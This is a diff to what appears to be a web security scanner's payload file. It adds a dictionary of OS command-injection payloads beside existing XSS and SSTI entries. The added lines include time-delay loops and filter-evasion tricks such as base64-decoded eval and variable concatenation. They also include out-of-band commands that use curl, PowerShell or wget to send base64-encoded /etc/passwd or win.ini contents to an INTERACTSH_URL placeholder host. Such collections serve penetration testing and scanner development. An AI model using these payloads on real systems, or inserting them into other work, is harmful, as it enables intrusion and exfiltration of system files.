@@ -67,6 +67,26 @@ XSS_PAYLOADS = {
         "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+", # Base64 Polyglot
     ]
 }
+
+CMD_PAYLOADS = {
+    "blind_time": [
+        "; for i in {1..1000000}; do :; done", # Linux Loop Delay
+        "& powershell -nop -c \"1..1000000 | % {}\"", # Windows PowerShell Loop
+        "$(perl -e 'select(undef,undef,undef,0.5)')", # Perl Sleep
+        "; bash -c 'echo $((1+1)) | sleep 5'", # Bash Arithmetic Delay
+    ],
+    "oob": [
+        "; curl --data \"$(base64 /etc/passwd)\" http://INTERACTSH_URL/", # Linux Base64 Exfil
+        "& powershell IWR -Uri http://INTERACTSH_URL/ -Method POST -Body ([Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\win.ini')))", # Windows Base64 Exfil
+        "$(wget -qO- http://INTERACTSH_URL/`openssl rand -hex 8`)", # Random Hex OOB
+    ],
+    "filter_evasion": [
+        "; ${PATH//:/\/bin\/}id", # PATH Manipulation
+        "& cmd /c \"set a=who&&set b=ami&&%a%%b%\"", # Windows Variable Concat
+        "; eval \"`echo aWQ=|base64 -d`\"", # Base64 Command Decode
+        "$(printf '%s\n' 'i' 'd' | tr -d '\n' | sh)", # Printf Command Build
+    ]
+}
 # --- Server-Side Template Injection (SSTI) Payloads ---
 SSTI_PAYLOADS = {
     "code_execution": {
